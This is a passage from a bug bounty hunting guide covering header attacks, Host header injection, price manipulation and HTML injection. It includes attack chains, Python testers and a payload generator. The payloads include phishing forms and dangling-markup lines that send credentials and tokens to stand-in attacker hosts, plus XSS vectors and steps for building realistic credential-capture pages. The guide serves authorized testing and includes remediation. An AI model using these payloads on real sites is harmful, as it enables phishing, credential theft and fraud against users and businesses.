├── Test EVERY input parameter with: <b>test</b>
├── URL parameters: ?q=<b>test</b>
├── Form fields: name, email, bio, comment, search
├── File upload names: upload a file named "<b>test</b>.txt"
├── Headers: User-Agent: <b>test</b>
├── JSON fields: {"name": "<b>test</b>"}
└── Check: does "test" appear in BOLD on the page?

Phase 2: DETERMINE CONTEXT (5 minutes)
├── View page source (Ctrl+U)
├── Where is your input rendered?
│   ├── Inside <p> tags → can inject block elements
│   ├── Inside attribute value → need to escape attribute first
│   ├── Inside <script> → JavaScript context, not HTML
│   ├── Inside <!-- comment --> → need to close comment first
│   └── Inside <textarea> → need to close textarea first
└── What encoding/escaping is applied?
    ├── < becomes &lt; → HTML entities → NOT vulnerable
    ├── < stays < → NO encoding → VULNERABLE!
    ├── < is removed → blacklist filter → try bypass
    └── < is encoded in some contexts but not others → partial vuln

Phase 3: TEST PAYLOAD DELIVERY (10 minutes)
├── Basic: <h1>test</h1>
├── Image: <img src=https://evil.com/test>
├── Link: <a href=https://evil.com>Click</a>
├── Form: <form action=https://evil.com><input name=x><button>Go</button></form>
├── Style: <div style="position:fixed;background:red;width:100%;height:100%">
├── Meta redirect: <meta http-equiv="refresh" content="0;url=https://evil.com">
├── Base tag: <base href="https://evil.com">
└── Try to escalate to XSS: <img src=x onerror=alert(1)>

Phase 4: ESCALATE (10 minutes)
├── Can you inject on a sensitive page? (login, payment, admin)
├── Can you escalate to XSS? (event handlers, base tag)
├── Can you steal CSRF tokens? (dangling markup)
├── Can you create a convincing phishing form?
├── Is it stored? (affects all users) or reflected? (needs victim to click)
└── Can you inject in emails? (phishing from trusted domain)

Phase 5: BUILD PoC (10 minutes)
├── Create a realistic phishing payload
├── Make it look like the real site's design
├── Include a form that captures credentials
├── Test it in multiple browsers
├── Take screenshots showing the injected content
└── Record video PoC

Phase 6: REPORT (10 minutes)
├── Explain the injection point clearly
├── Show before/after screenshots
├── Demonstrate the phishing scenario
├── Calculate impact (how many users affected)
├── Note: reflected vs stored
├── Include remediation: escape all user input in HTML context
│   → Use framework auto-escaping (Django, React, Angular)
│   → Implement Content-Security-Policy
│   → Use DOMPurify for rich text sanitization
└── Include CVSS score
```

---

<!-- ═══════════════════════════════════════════════════════════════ -->
<!--                  PART E: CROSS-CUTTING SECTIONS                  -->
<!-- ═══════════════════════════════════════════════════════════════ -->

# PART E — 🔗 Cross-Cutting

---

## 33. ⛓️ Chaining These 4 Vulns Together

The real power comes from combining these vulnerability classes.

### Chain 1: Host Header Injection + HTML Injection = Phishing at Scale

```
Attack flow:
1. Find Host Header Injection on password reset endpoint
2. Victim gets email with reset link pointing to evil.com
3. evil.com shows a page with HTML that mimics target.com
4. Page has an HTML-injected "enter new password" form
5. Credentials captured via the fake form

Impact: Account takeover via realistic phishing
Severity: Critical (trusted email + trusted-looking page)
```

### Chain 2: Price Manipulation + IDOR = Rob the Store

```
Attack flow:
1. Find price manipulation: can set price to $0.01
2. Find IDOR: can place orders for OTHER accounts
3. Combine: place $0.01 orders charged to other users
4. Products shipped to attacker's address

Impact: Financial theft + affecting other customers
Severity: Critical
```

### Chain 3: HTTP Header Injection + Cache Poisoning + HTML Injection

```
Attack flow:
1. CRLF injection in a cached endpoint
2. Inject response splitting → inject HTML body
3. Cache stores the poisoned response
4. ALL visitors see attacker's HTML (phishing form)
5. Credentials stolen at scale

Impact: Mass credential theft via cache poisoning
Severity: Critical
```

### Chain 4: HTML Injection + Price Manipulation = Social Engineering

```
Attack flow:
1. HTML injection on product page → inject fake "SALE 90% OFF" banner
2. Users see the "sale" on a trusted domain
3. Users attempt to purchase at the "discounted" price
4. Price manipulation in checkout → charge the real (higher) price
5. Or: inject HTML with a "special checkout link" → phishing form

Impact: User deception + financial manipulation
Severity: High
```

### Chain 5: Host Header + IP Spoofing + Auth Bypass = Full Admin Access

```
Attack flow:
1. X-Forwarded-For: 127.0.0.1 → bypass IP restriction
2. Host: admin.internal.target.com → route to admin panel
3. X-Original-URL: /admin/dashboard → bypass path restrictions
4. Full admin panel access!

Impact: Complete administrative access
Severity: Critical
```

### Chain 6: HTML Injection in Email + Host Header = Spear Phishing

```
Attack flow:
1. Find HTML injection in "invite user" feature
2. Inject phishing HTML in the invitation email body
3. Use Host Header injection to make links point to evil.com
4. Email comes FROM target.com (trusted sender)
5. Email CONTENT is attacker-controlled (phishing)
6. Links point to evil.com (credential capture)

Impact: Perfectly crafted spear phishing from trusted domain
Severity: High-Critical
```

---

## 34. 🤖 Automation & Scripts

### Script 1: Security Header Scanner (Python)

```python
#!/usr/bin/env python3
"""
Security Header Scanner v1.0 — by Vishal
Checks for missing/weak security headers on any target.

Usage: python3 header_scanner.py -u https://target.com
"""

import requests
import sys
import argparse
from datetime import datetime

class SecurityHeaderScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.headers = {}
    
    def scan(self):
        try:
            resp = requests.get(self.url, timeout=10, allow_redirects=True)
            self.headers = dict(resp.headers)
        except Exception as e:
            print(f"[!] Error: {e}")
            return
        
        self._check_csp()
        self._check_hsts()
        self._check_xframe()
        self._check_xcontent_type()
        self._check_cors()
        self._check_referrer_policy()
        self._check_permissions_policy()
        self._check_server_info()
        
        return self.findings
    
    def _check_csp(self):
        csp = self.headers.get('Content-Security-Policy', '')
        if not csp:
            self.findings.append({
                'header': 'Content-Security-Policy',
                'status': 'MISSING',
                'severity': 'Medium',
                'detail': 'No CSP header found. XSS attacks have no defense-in-depth.'
            })
        else:
            if "'unsafe-inline'" in csp:
                self.findings.append({
                    'header': 'CSP - unsafe-inline',
                    'status': 'WEAK',
                    'severity': 'Medium',
                    'detail': 'CSP allows unsafe-inline scripts. Inline XSS still works.'
                })
            if "'unsafe-eval'" in csp:
                self.findings.append({
                    'header': 'CSP - unsafe-eval',
                    'status': 'WEAK',
                    'severity': 'Medium',
                    'detail': 'CSP allows unsafe-eval. eval()-based XSS still works.'
                })
            if 'default-src *' in csp or "default-src '*'" in csp:
                self.findings.append({
                    'header': 'CSP - wildcard',
                    'status': 'WEAK',
                    'severity': 'High',
                    'detail': 'CSP default-src is wildcard (*). Effectively no protection.'
                })
    
    def _check_hsts(self):
        hsts = self.headers.get('Strict-Transport-Security', '')
        if not hsts:
            self.findings.append({
                'header': 'Strict-Transport-Security',
                'status': 'MISSING',
                'severity': 'Medium',
                'detail': 'No HSTS header. Site vulnerable to SSL stripping.'
            })
        else:
            import re
            max_age = re.search(r'max-age=(\d+)', hsts)
            if max_age and int(max_age.group(1)) < 31536000:
                self.findings.append({
                    'header': 'HSTS - short max-age',
                    'status': 'WEAK',
                    'severity': 'Low',
                    'detail': f'HSTS max-age is {max_age.group(1)}s. Should be ≥31536000.'
                })
    
    def _check_xframe(self):
        xfo = self.headers.get('X-Frame-Options', '')
        csp = self.headers.get('Content-Security-Policy', '')
        if not xfo and 'frame-ancestors' not in csp:
            self.findings.append({
                'header': 'X-Frame-Options / frame-ancestors',
                'status': 'MISSING',
                'severity': 'Medium',
                'detail': 'No clickjacking protection. Page can be framed.'
            })
    
    def _check_xcontent_type(self):
        if 'X-Content-Type-Options' not in self.headers:
            self.findings.append({
                'header': 'X-Content-Type-Options',
                'status': 'MISSING',
                'severity': 'Low',
                'detail': 'No MIME-sniffing protection.'
            })
    
    def _check_cors(self):
        acao = self.headers.get('Access-Control-Allow-Origin', '')
        acac = self.headers.get('Access-Control-Allow-Credentials', '')
        if acao == '*' and acac.lower() == 'true':
            self.findings.append({
                'header': 'CORS',
                'status': 'VULNERABLE',
                'severity': 'High',
                'detail': 'CORS allows all origins with credentials. Data theft possible.'
            })
    
    def _check_referrer_policy(self):
        if 'Referrer-Policy' not in self.headers:
            self.findings.append({
                'header': 'Referrer-Policy',
                'status': 'MISSING',
                'severity': 'Low',
                'detail': 'No Referrer-Policy. Full URL leaked in Referer header.'
            })
    
    def _check_permissions_policy(self):
        if 'Permissions-Policy' not in self.headers and \
           'Feature-Policy' not in self.headers:
            self.findings.append({
                'header': 'Permissions-Policy',
                'status': 'MISSING',
                'severity': 'Low',
                'detail': 'No Permissions-Policy. Browser features unrestricted.'
            })
    
    def _check_server_info(self):
        server = self.headers.get('Server', '')
        powered = self.headers.get('X-Powered-By', '')
        if server and any(v in server for v in ['/', 'Apache', 'nginx', 'IIS']):
            self.findings.append({
                'header': 'Server',
                'status': 'INFO',
                'severity': 'Info',
                'detail': f'Server version disclosed: {server}'
            })
        if powered:
            self.findings.append({
                'header': 'X-Powered-By',
                'status': 'INFO',
                'severity': 'Info',
                'detail': f'Technology disclosed: {powered}'
            })
    
    def print_report(self):
        print(f"\n{'='*65}")
        print(f"  Security Header Scan — {datetime.now().strftime('%Y-%m-%d %H:%M')}")
        print(f"  Target: {self.url}")
        print(f"{'='*65}\n")
        
        if not self.findings:
            print("  ✅ All security headers present and correctly configured!")
        else:
            for f in self.findings:
                icon = {'MISSING': '❌', 'WEAK': '⚠️', 'VULNERABLE': '🔴', 'INFO': 'ℹ️'}
                print(f"  {icon.get(f['status'], '?')} [{f['severity']}] {f['header']}: {f['status']}")
                print(f"     {f['detail']}\n")
        
        print(f"{'='*65}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Security Header Scanner by Vishal')
    parser.add_argument('-u', '--url', required=True)
    args = parser.parse_args()
    
    scanner = SecurityHeaderScanner(args.url)
    scanner.scan()
    scanner.print_report()
```

### Script 2: Host Header Injection Tester (Python)

```python
#!/usr/bin/env python3
"""
Host Header Injection Tester v1.0 — by Vishal
Tests an endpoint for Host Header Injection vulnerabilities.

Usage: python3 host_inject.py -u https://target.com/forgot-password -d "email=test@test.com"
"""

import requests
import argparse
import re

def test_host_injection(url, data=None, method='POST'):
    tests = [
        {'name': 'Basic Host override', 'headers': {'Host': 'evil.com'}},
        {'name': 'X-Forwarded-Host', 'headers': {'X-Forwarded-Host': 'evil.com'}},
        {'name': 'X-Host', 'headers': {'X-Host': 'evil.com'}},
        {'name': 'X-Forwarded-Server', 'headers': {'X-Forwarded-Server': 'evil.com'}},
        {'name': 'Forwarded header', 'headers': {'Forwarded': 'host=evil.com'}},
        {'name': 'X-Original-Host', 'headers': {'X-Original-Host': 'evil.com'}},
        {'name': 'X-HTTP-Host-Override', 'headers': {'X-HTTP-Host-Override': 'evil.com'}},
        {'name': 'Host with port', 'headers': {'Host': f'{requests.utils.urlparse(url).hostname}:evil.com'}},
    ]
    
    print(f"\n[*] Testing Host Header Injection on: {url}\n")
    
    for test in tests:
        try:
            if method.upper() == 'POST':
                resp = requests.post(url, data=data, headers=test['headers'], 
                                    allow_redirects=False, timeout=10)
            else:
                resp = requests.get(url, headers=test['headers'],
                                   allow_redirects=False, timeout=10)
            
            body = resp.text.lower()
            headers_str = str(resp.headers).lower()
            
            if 'evil.com' in body or 'evil.com' in headers_str:
                print(f"  🔴 VULNERABLE | {test['name']}")
                print(f"     → 'evil.com' found in response!")
                if 'evil.com' in body:
                    # Find the line containing evil.com
                    for line in resp.text.split('\n'):
                        if 'evil.com' in line.lower():
                            print(f"     → Body: {line.strip()[:100]}")
                            break
            elif resp.status_code in [200, 302]:
                print(f"  ⚠️  CHECK   | {test['name']} → {resp.status_code}")
            else:
                print(f"  ✅ SAFE    | {test['name']} → {resp.status_code}")
        except Exception as e:
            print(f"  ❓ ERROR   | {test['name']} → {e}")
    
    print()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Host Header Injection Tester by Vishal')
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-d', '--data', help='POST data (key=val&key=val)')
    parser.add_argument('-m', '--method', default='POST')
    args = parser.parse_args()
    
    data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                data[k] = v
    
    test_host_injection(args.url, data, args.method)
```

### Script 3: HTML Injection Payload Generator

```bash
#!/bin/bash
# html_inject_payloads.sh — Generate HTML injection test payloads
# Usage: ./html_inject_payloads.sh

echo "=== HTML Injection Payloads ==="
echo ""
echo "--- Basic Detection ---"
echo '<b>htmli_test</b>'
echo '<h1>htmli_test</h1>'
echo '<u>htmli_test</u>'
echo '<marquee>htmli_test</marquee>'
echo ''
echo "--- Phishing Form ---"
echo '<form action="https://ATTACKER.COM/steal"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>'
echo ''
echo "--- Content Spoofing ---"
echo '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;text-align:center;padding-top:200px"><h1>Account Suspended</h1><p>Contact support@evil.com</p></div>'
echo ''
echo "--- Image Tracking ---"
echo '<img src="https://ATTACKER.COM/track" style="display:none">'
echo ''
echo "--- Meta Redirect ---"
echo '<meta http-equiv="refresh" content="0;url=https://ATTACKER.COM">'
echo ''
echo "--- Base Tag ---"
echo '<base href="https://ATTACKER.COM/">'
echo ''
echo "--- Dangling Markup ---"
echo '"><img src="https://ATTACKER.COM/steal?data='
echo ''
echo "--- XSS Escalation Attempts ---"
echo '<img src=x onerror=alert(1)>'
echo '<svg onload=alert(1)>'
echo '<input onfocus=alert(1) autofocus>'
echo '<details open ontoggle=alert(1)>'
```

---

## 35. 📝 Bug Bounty Report Templates

### Template 1: HTTP Header Vulnerability Report

```markdown
# [Header Type] Injection on [Endpoint]

## Summary
A [CRLF/Host Header/X-Forwarded-For] injection vulnerability was 
identified on [endpoint]. An attacker can [specific impact].

## Severity: [Critical/High/Medium]
CVSS: [Score]

## Affected Endpoint
- URL: [URL]
- Method: [METHOD]
- Vulnerable Header: [Header name]

## Steps to Reproduce
1. Open Burp Suite and configure browser proxy
2. Navigate to [URL]
3. Intercept the request in Burp Repeater
4. Modify the [Header] to: [payload]
5. Send the request
6. Observe: [what happens]

## Request
[Paste full HTTP request]

## Response
[Paste relevant response showing injection]

## Impact
[Describe specific impact — ATO, cache poisoning, etc.]

## Remediation
- Validate and sanitize all HTTP headers before use
- Never use Host header for URL generation — use server config
- Implement proper header allowlisting at the reverse proxy level
- Set security headers: CSP, HSTS, X-Frame-Options
```

### Template 2: Price Manipulation Report

```markdown
# Price Manipulation on [Feature] — [Amount] Purchase for $[Exploited Price]

## Summary
A business logic vulnerability in the [checkout/cart/subscription] 
flow allows an attacker to purchase [product/service] worth $[real price]
for $[exploited price] by manipulating the [parameter] in the 
[request endpoint].

## Severity: High
CVSS: [Score]

## Financial Impact
- Normal price: $[X]
- Exploited price: $[Y]  
- Loss per transaction: $[X-Y]
- Potential scale: [how many times can this be repeated]
- Maximum financial impact: $[total potential loss]

## Steps to Reproduce
1. Add [product] to cart (normal price: $[X])
2. Proceed to checkout
3. Intercept the [endpoint] request in Burp
4. Modify [parameter] from [original] to [exploited]
5. Forward the request
6. Complete payment — charged $[Y] instead of $[X]
7. Order confirmation shows successful purchase at $[Y]

## Request (Before)
[Original request with real price]

## Request (After — Exploited)
[Modified request with exploited price]

## Remediation
- NEVER trust client-side price values
- Calculate all totals server-side from product catalog database
- Validate quantity (positive integer only, within reasonable range)
- Implement idempotency keys for payment transactions
- Log all price discrepancies for fraud detection
```

### Template 3: HTML Injection Report

```markdown
# HTML Injection on [Page] Allows [Phishing/Content Spoofing]

## Summary
A [Stored/Reflected] HTML Injection vulnerability exists in the 
[parameter] of [page/feature]. An attacker can inject arbitrary 
HTML content that renders on [target.com], enabling [phishing 
attacks / content spoofing / credential theft].

## Severity: [Medium/High]
CVSS: [Score]

## Type: [Reflected / Stored]

## Steps to Reproduce
1. Navigate to [URL]
2. In the [field name], enter: [payload]
3. Submit the form / visit the URL
4. Observe: injected HTML renders on the page
5. [For stored: visit the page as a different user → injection visible]

## Proof of Concept
### Injected URL:
[Full URL with HTML injection payload]

### Phishing Payload:
[Full HTML payload that creates a fake login form]

### Screenshot:
[Screenshot showing the injected content on target.com's domain]

## Impact
- Attacker can create convincing phishing pages on target.com's domain
- Users trust target.com → will enter credentials in fake forms
- [For stored: affects ALL users who visit the page]
- [For email injection: phishing emails from trusted sender]

## Remediation
- HTML-encode all user input before rendering: < → &lt;, > → &gt;
- Use framework auto-escaping (Django, React, Angular all do this by default)
- Implement Content-Security-Policy header
- For rich text: use allowlist-based sanitizer (DOMPurify)
```

---

## 36. ✅ Complete Hunting Checklist

```
╔══════════════════════════════════════════════════════════════════════╗
║              ADVANCED WEB VULNERABILITY HUNTING CHECKLIST            ║
║                           by Vishal                                  ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  🔴 HTTP HEADER ATTACKS                                             ║
║  [ ] Check all security headers (CSP, HSTS, XFO, XCTO, CORS)       ║
║  [ ] Test CRLF injection on redirects (%0d%0a)                      ║
║  [ ] Test CRLF in cookie-setting parameters                         ║
║  [ ] Try double encoding (%250d%250a)                               ║
║  [ ] Test X-Forwarded-For spoofing (15+ header variations)          ║
║  [ ] Test hop-by-hop header stripping (Connection: close, Auth)     ║
║  [ ] Test X-Original-URL / X-Rewrite-URL path override             ║
║  [ ] Test X-HTTP-Method-Override                                    ║
║  [ ] Run Param Miner for unkeyed headers (cache poisoning)          ║
║  [ ] Run HTTP Request Smuggler (CL.TE, TE.CL)                      ║
║  [ ] Check CORS: does it reflect arbitrary Origin?                  ║
║  [ ] Check CSP for unsafe-inline / unsafe-eval / wildcards          ║
║                                                                      ║
║  🟡 PRICE / BUSINESS LOGIC MANIPULATION                             ║
║  [ ] Map the complete purchase flow (all requests)                   ║
║  [ ] Identify all price/quantity/total parameters                    ║
║  [ ] Change price to: 0, 0.01, -1, 99999999                        ║
║  [ ] Change quantity to: 0, -1, 0.001, MAX_INT                     ║
║  [ ] Swap product_id (cheap → expensive)                            ║
║  [ ] Test coupon stacking (same code multiple times)                ║
║  [ ] Test race condition on coupons (parallel requests)              ║
║  [ ] Try expired coupon codes                                        ║
║  [ ] Brute force coupon codes (patterns, wordlists)                 ║
║  [ ] Change currency mid-checkout                                    ║
║  [ ] Manipulate shipping cost                                        ║
║  [ ] Manipulate tax/fees                                             ║
║  [ ] Skip checkout steps (go directly to confirm)                    ║
║  [ ] Go backwards in checkout flow                                   ║
║  [ ] Test race condition on payments (double-spend)                  ║
║  [ ] Manipulate subscription plan_id                                 ║
║  [ ] Test trial extension via parameters                             ║
║  [ ] Downgrade plan, check if features persist                       ║
║  [ ] Test gift card negative amounts                                 ║
║  [ ] Test referral self-referral                                     ║
║  [ ] Search JS source for hardcoded prices/coupons                   ║
║                                                                      ║
║  🟣 HOST HEADER INJECTION                                            ║
║  [ ] Change Host header to evil.com                                  ║
║  [ ] Test X-Forwarded-Host: evil.com                                ║
║  [ ] Test X-Host, Forwarded, X-Forwarded-Server                     ║
║  [ ] Test duplicate Host headers                                     ║
║  [ ] Test Host with port (target.com:evil)                           ║
║  [ ] Test absolute URL in request line                               ║
║  [ ] Test password reset with modified Host                          ║
║  [ ] Test email verification with modified Host                      ║
║  [ ] Test OAuth callbacks with modified Host                         ║
║  [ ] Check for cache poisoning via Host                              ║
║  [ ] Check for SSRF via Host (127.0.0.1, metadata IPs)              ║
║  [ ] Test web cache deception (path confusion)                       ║
║                                                                      ║
║  🔵 HTML INJECTION                                                   ║
║  [ ] Test <b>test</b> in all input fields                           ║
║  [ ] Test in URL parameters                                         ║
║  [ ] Test in form fields (name, bio, comment, search)                ║
║  [ ] Test in file upload names                                       ║
║  [ ] Test in HTTP headers (User-Agent, Referer)                      ║
║  [ ] Test in JSON fields                                             ║
║  [ ] Check if HTML renders or is escaped                             ║
║  [ ] Try phishing form injection                                     ║
║  [ ] Try content spoofing (full-page overlay)                        ║
║  [ ] Try image tracking (<img src=evil.com>)                         ║
║  [ ] Try meta refresh redirect                                       ║
║  [ ] Try base tag injection                                          ║
║  [ ] Try dangling markup (CSRF token theft)                          ║
║  [ ] Attempt XSS escalation (event handlers)                         ║
║  [ ] Test in email context (invite features)                         ║
║  [ ] Test in PDF generation context                                  ║
║  [ ] Test in Markdown rendering context                              ║
║  [ ] Check if injection is stored vs reflected                       ║
║                                                                      ║
║  ⛓️ CHAINING                                                        ║
║  [ ] Can Host Header + HTML Injection = phishing from trusted email? ║
║  [ ] Can Price Manipulation + IDOR = steal from other users?         ║
║  [ ] Can CRLF + Cache = mass XSS via cache poisoning?               ║
║  [ ] Can HTML Injection → XSS escalation?                           ║
║  [ ] Can IP Spoofing + Host Header = admin access?                   ║
║                                                                      ║
║  📝 REPORTING                                                        ║
║  [ ] Working PoC in latest browsers                                  ║
║  [ ] Before/after screenshots                                        ║
║  [ ] Video PoC                                                       ║
║  [ ] Financial impact calculated (for price bugs)                    ║
║  [ ] CVSS score calculated                                           ║
║  [ ] Remediation included                                            ║
║  [ ] Full HTTP request/response included                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## 37. 📚 Resources & References

### Books

```
1. "The Web Application Hacker's Handbook" — Stuttard & Pinto
   → Chapter 4: HTTP headers, Chapter 11: Logic flaws
   → THE bible for web security

2. "Bug Bounty Bootcamp" — Vickie Li
   → Chapters on Host Header, Business Logic, HTML Injection
   → Modern, practical, bounty-focused

3. "Real-World Bug Hunting" — Peter Yaworski
   → Multiple case studies on all 4 vulnerability types
   → Shows real HackerOne/Bugcrowd reports

4. "Web Security for Developers" — Malcolm McDonald
   → Clear explanations of HTTP security headers
   → Good for understanding defenses

5. "Hacking APIs" — Corey Ball
   → API-specific price manipulation and header attacks
   → REST, GraphQL, gRPC attack techniques

6. "The Tangled Web" — Michal Zalewski
   → Deep dive into browser security
   → Understanding why HTML injection and header attacks work

7. "OWASP Testing Guide v4"
   → Sections on business logic, header injection, HTML injection
   → Free: https://owasp.org/www-project-web-security-testing-guide/
```

### Practice Labs

```
1. PortSwigger Web Security Academy (FREE)
   https://portswigger.net/web-security
   → HTTP Host Header attacks (6 labs)
   → HTTP Request Smuggling (16 labs)
   → Business Logic Vulnerabilities (12 labs)
   → Web Cache Poisoning (13 labs)
   → BEST free training for all 4 vuln types

2. DVWA — Damn Vulnerable Web Application
   https://github.com/digininja/DVWA
   → HTML Injection challenges at all levels

3. bWAPP — Buggy Web Application
   http://www.itsecgames.com/
   → HTML Injection, Header Injection, Business Logic

4. HackTheBox Web Challenges
   https://www.hackthebox.com/
   → Realistic header and logic challenges

5. OWASP WebGoat
   https://owasp.org/www-project-webgoat/
   → Business logic lessons

6. PentesterLab
   https://pentesterlab.com/
   → Host Header, Price Manipulation exercises

7. TryHackMe
   https://tryhackme.com/
   → Multiple rooms on headers and business logic

8. Google Gruyere
   https://google-gruyere.appspot.com/
   → HTML Injection exercises

9. Juice Shop (OWASP)
   https://owasp.org/www-project-juice-shop/
   → Price manipulation, business logic, injection challenges

10. HackerOne CTF (Hacker101)
    https://ctf.hacker101.com/
    → Real-world style challenges
```

### Essential Tools

```
Burp Suite Pro               → Main testing tool for ALL 4 vuln types
  → Repeater: Manual header/parameter testing
  → Intruder: Automated testing (brute force, fuzzing)
  → Extensions: Param Miner, HTTP Request Smuggler

OWASP ZAP                   → Free alternative to Burp
  https://www.zaproxy.org/

Param Miner (Burp)          → Find unkeyed headers for cache poisoning
HTTP Request Smuggler (Burp) → Detect request smuggling
Logger++ (Burp)             → Advanced request/response logging
Backslash Powered Scanner    → Find header injection points
Active Scan++               → Enhanced scanning for headers

securityheaders.com          → Quick security header audit
  https://securityheaders.com/

Mozilla Observatory          → Comprehensive header analysis
  https://observatory.mozilla.org/

curl                         → Command-line header testing
  curl -sI https://target.com | grep -i security

httpie                       → Better curl for API testing
  https://httpie.io/

Nuclei                       → Template-based scanner
  https://github.com/projectdiscovery/nuclei
  → Has templates for header misconfigurations
```

### Useful Links

```
OWASP Testing Guide — HTTP Header Injection
→ https://owasp.org/www-community/attacks/HTTP_Response_Splitting

PortSwigger — Host Header Attacks
→ https://portswigger.net/web-security/host-header

PortSwigger — Business Logic Vulnerabilities
→ https://portswigger.net/web-security/logic-flaws

PortSwigger — HTTP Request Smuggling
→ https://portswigger.net/web-security/request-smuggling

PortSwigger — Web Cache Poisoning
→ https://portswigger.net/web-security/web-cache-poisoning

James Kettle — Practical Cache Poisoning
→ https://portswigger.net/research/practical-web-cache-poisoning

James Kettle — HTTP Desync Attacks
→ https://portswigger.net/research/http-desync-attacks

OWASP — Business Logic Security
→ https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability

HackerOne Disclosed Reports
→ https://hackerone.com/hacktivity (search: host header, price, html injection)

Mozilla MDN — HTTP Headers
→ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

SecurityHeaders.com
→ https://securityheaders.com/

CSP Evaluator (Google)
→ https://csp-evaluator.withgoogle.com/
```

### Community

```
Twitter/X — Follow for research:
→ @albinowax (James Kettle — cache poisoning, smuggling)
→ @NahamSec (bug bounty, live hacking)
→ @staborsk (web security research)
→ @samwcyo (Sam Curry — business logic bugs)
→ @InsiderPhD (bug bounty education)
→ @0xInfection (web security tools)

YouTube:
→ PortSwigger (official lab walkthroughs)
→ NahamSec (live bug bounty hunting)
→ STÖK (bug bounty tips)
→ InsiderPhD (academic + practical)
→ LiveOverflow (deep technical)
→ John Hammond (CTF walkthroughs)
→ PwnFunction (visual web security explanations)

Discord:
→ Bug Bounty Hunter (NahamSec's)
→ HackerOne Community
→ PortSwigger Web Security

Subreddits:
→ r/bugbounty
→ r/netsec
→ r/websecurity
→ r/AskNetsec
```

---

## 🎯 Final Words

```
These 4 vulnerability classes — HTTP Headers, Price Manipulation, 
Host Header Injection, and HTML Injection — share one thing:

THEY'RE ALL ABOUT TRUST.

• Servers TRUST headers they shouldn't trust
• Backends TRUST prices the client sends  
• Applications TRUST the Host header for critical URLs
• Pages TRUST user input to be text, not HTML

The specialist hunter understands:
→ WHERE trust exists
→ HOW to violate that trust  
→ WHAT impact results from broken trust
→ HOW TO COMMUNICATE that impact to programs

Start with PortSwigger labs for each category.
Move to real targets on HackerOne/Bugcrowd/Intigriti.
Use the checklist. Follow the methodology.
Chain vulns together for maximum impact and bounty.

Think creatively. Understand the business logic.
Test what scanners can't test.

That's how you become a specialist.

Happy hunting! 🔥

— Vishal
```

---

> **Document:** Advanced Web Vulnerability Hunting Guide v1.0  
> **Author:** Vishal  
> **Last Updated:** February 2026  
> **Covers:** HTTP Header Attacks, Price Manipulation, Host Header Injection, HTML Injection  
> **License:** Educational use only — for authorized security testing

